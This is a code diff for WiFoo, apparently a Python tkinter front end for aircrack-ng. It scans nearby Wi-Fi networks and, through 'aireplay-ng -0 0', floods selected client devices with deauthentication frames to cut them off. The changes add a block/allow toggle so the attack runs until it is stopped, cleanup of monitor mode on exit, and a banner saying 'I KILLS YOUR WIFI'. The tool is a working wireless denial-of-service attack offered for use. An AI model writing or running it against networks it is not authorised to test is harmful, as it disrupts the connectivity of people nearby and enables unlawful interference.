@@ -1,13 +1,57 @@
 #!/usr/bin/python3
 
-#TODO: Check for monitor mode enabled devices before starting
-#TODO: Disable monitor mode on script exit
-#TODO: Refactor code
+# + TODO: Disable monitor mode on script exit
+
+# - TODO: Check for monitor mode enabled devices before starting
+# - TODO: Make app icon using icon_script, without any external libraries
+# - TODO: Refactor code
+
+
+
+
+
+icon_script = \
+'''
+                      .ed"""" """$$$$be.
+                    -"           ^""**$$$e.
+                  ."                   '$$$c
+                 /                      "4$$b
+                d  3                      $$$$
+                $  *                   .$$$$$$
+               .$  ^c           $$$$$e$$$$$$$$.
+               d$L  4.         4$$$$$$$$$$$$$$b
+               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
+   e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
+  z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
+ 4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
+ ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
+   "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
+         "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
+           ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
+              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
+                "*$$$  *=%4.$ L L$ P3$$$F $$$P"
+                   "$   "%*ebJLzb$e$$$$$b $P"
+                     %..      4$$$$$$$$$$ "
+                      $$$e   z$$$$$$$$$$%
+                       "*$c  "$$$$$$$P"
+                        ."""*$$$$$$$$bc
+                     .-"    .$***$$$"""*e.
+                  .-"    .e$"     "*$c  ^*b.
+           .=*""""    .e$*"          "*bc  "*$e..
+         .$"        .z*"               ^*$e.   "*****e.
+         $$ee$c   .d"                     "*$.        3.
+         ^*$E")$..$"                         *   .ee==d%
+            $.d$$$*                           *  J$$$e*
+             """""                              "$$$"
+
+##### ##### ##### #### I KILLS YOUR WIFI #### ##### #### #### #####
+'''
 
 from tkinter import *
 from tkinter import ttk
-import tkinter as tk
 from tkinter import messagebox
+import tkinter as tk
+
 
 import time
 import re
@@ -15,6 +59,9 @@ import subprocess
 import os
 import logging
 import signal
+from threading import Thread
+import atexit
+
 
 
 
@@ -22,25 +69,28 @@ def put_in_xterm_format(command):
     return 'xterm -iconic -title shell -geometry 200x24+0+1000 -e "%s"'%command
 
 
-def run_command_in_shell(command_to_run,max_timeout_in_sec):
-    print("running command",command_to_run)
-   
-    output=""        
+def run_command_in_shell(command_to_run,max_timeout_in_sec=None,discard_output_and_return_pid=False):
+    print("running command:",command_to_run)
 
-    with open("/tmp/wifoo_out.txt",'w+') as infile:
-        with subprocess.Popen(put_in_xterm_format(command_to_run + " > /tmp/wifoo_out.txt 2>&1"), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid) as process: 
-            try:
-                output = process.communicate(timeout=max_timeout_in_sec)[0]
-            except subprocess.TimeoutExpired:
-                os.killpg(process.pid, signal.SIGKILL)
-                output = process.communicate()[0]
-     
-        infile.seek(0)
-        output = "".join(infile.readlines())
+    if discard_output_and_return_pid:
+        process = subprocess.Popen(put_in_xterm_format(command_to_run), stdout=None, stderr=None, shell=True, preexec_fn=os.setsid)
+        return process.pid
 
-    return output
+    else:
+        output=""        
 
+        with open("/tmp/wifoo_out.txt",'w+') as infile:
+            with subprocess.Popen(put_in_xterm_format(command_to_run + " > /tmp/wifoo_out.txt 2>&1"), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid) as process: 
+                try:
+                    process.communicate(timeout=max_timeout_in_sec)[0]
+                except subprocess.TimeoutExpired:
+                    os.killpg(process.pid, signal.SIGKILL)
+                    process.communicate()[0]
+            
+                infile.seek(0)
+                output = "".join(infile.readlines())
 
+        return output
 
 
 
@@ -273,11 +323,23 @@ def get_routers_and_devices_on_nearby_networks(monitor_mode_enabled_interface):
 
 class GetRoutersAndDevices:
     def __init__(self, master,chosen_non_monitor_mode_enabled_interface):
+
+
+        self.is_blocking = False
+        self.selected_devices_indexes = []
+        self.pid_deauth_command = -1
+
         self.master = master
         master.title("Routers and devices")
 
         self.monitor_mode_enabled_interface = get_monitor_mode_enabled_interface_using_non_monitor_mode_enabled_interface(chosen_non_monitor_mode_enabled_interface)
+        if(self.monitor_mode_enabled_interface != ""):
+            atexit.register(self.stop_monitor_mode)
+
         self.all_routers,self.all_devices = get_routers_and_devices_on_nearby_networks(self.monitor_mode_enabled_interface)
+
+
+
 
         self.wifi_listbox = Listbox(self.master)
         self.choose_devices_listbox = Listbox(self.master,selectmode='multiple')
@@ -298,8 +360,8 @@ class GetRoutersAndDevices:
 
 
 
-        self.block_everyone_button = Button(self.master, text="Deauth selected targets for 15 seconds", bg='red', command=self.block_selected_devices)
-        self.block_everyone_button.pack(side=BOTTOM, fill=X)
+        self.toggle_block_or_permit_button = Button(self.master, text="Deauth selected targets", bg='red', command=self.toggle_block_or_permit_devices)
+        self.toggle_block_or_permit_button.pack(side=BOTTOM, fill=X)
 
 
         choose_devices = Label(self.master, text='Choose Devices: ',anchor='nw')   
@@ -311,6 +373,9 @@ class GetRoutersAndDevices:
 
 
 
+    def stop_monitor_mode(self):
+        stop_monitor_mode_command = "airmon-ng stop %s"%(self.monitor_mode_enabled_interface)
+        run_command_in_shell(stop_monitor_mode_command,10)
 
 
 
@@ -350,31 +415,50 @@ class GetRoutersAndDevices:
 
 
             lock_channel_command = "airodump-ng -c %s %s"%(selected_ap_channel,self.monitor_mode_enabled_interface)
-            final_command = "aireplay-ng -0 0 -a %s -c %s %s"%(selected_ap_mac,client_mac_params,self.monitor_mode_enabled_interface)
+            run_deauth_command = "aireplay-ng -0 0 -a %s -c %s %s"%(selected_ap_mac,client_mac_params,self.monitor_mode_enabled_interface)
 
-
-            print('final_command',final_command)
-
-            print('run_command_in_shell(lock_channel_command)',run_command_in_shell(lock_channel_command,3))
-
-
-            print('run_command_in_shell(final_command)',run_command_in_shell(final_command,15))
-
-        
 
             self.choose_devices_listbox.selection_clear(0,END)
+
+            run_command_in_shell(lock_channel_command,3)
+            self.pid_deauth_command = run_command_in_shell(run_deauth_command,discard_output_and_return_pid=True)
+
+
+            if self.pid_deauth_command > 0:
+                return True
 
 
         else:
             tk.messagebox.showinfo("Device not selected", "Please select devices to block")
 
 
+
+
+    def permit_all_devices(self):
+        print("allowing access to all")
+
+        for i,item in enumerate(self.get_devices_connected_to_router(self.router_selected[0], self.all_devices)):
+            self.choose_devices_listbox.itemconfig(i,bg='white')
+
+
+        if os.killpg(self.pid_deauth_command, signal.SIGKILL) == None:
+            return True
+
+    def toggle_block_or_permit_devices(self):
+        if self.is_blocking:
+            if self.permit_all_devices():
+                self.toggle_block_or_permit_button.configure(bg = 'red',text = 'Block selected devices') 
+                self.is_blocking = False
+            
+
+        else:
+            if self.block_selected_devices():
+                self.toggle_block_or_permit_button.configure(bg = 'green',text = 'Allow everyone') 
+                self.is_blocking = True
+
         
-        pass
 
 
-    def permit_selected_devices(self):
-        pass
 
     def get_devices_connected_to_router(self,router,all_devices):
         current_router_devices = list()
@@ -477,12 +561,14 @@ class SplashScreen(Frame):
 
         canvas = Canvas(self,width=w, height=h,bg='#ffffff')
 
+        version_picture = "version1.gif"
+        if os.path.isfile(version_picture):
+            gif1 = PhotoImage(file=version_picture)
+            canvas.create_image((0, 0), image=gif1, anchor='nw')
 
-        gif1 = PhotoImage(file="version1.gif")
-
-
-        canvas.create_image((0, 0), image=gif1, anchor=NW)
-        canvas.image = gif1
+        else:
+            canvas.create_text(250,150,fill="darkblue",font="Times 20 italic bold",
+                        text="WiFoo is open-source get in from: \nhttps://github.com/abeltesfaye/WiFoo")
 
         canvas.grid()
 
@@ -496,7 +582,7 @@ class SplashScreen(Frame):
 
 
         while True:
-            if time.time() - start > 2:#todo: change this into 2 later
+            if time.time() - start > 2:
                 self.start_choose_interface(None)
                 break
 
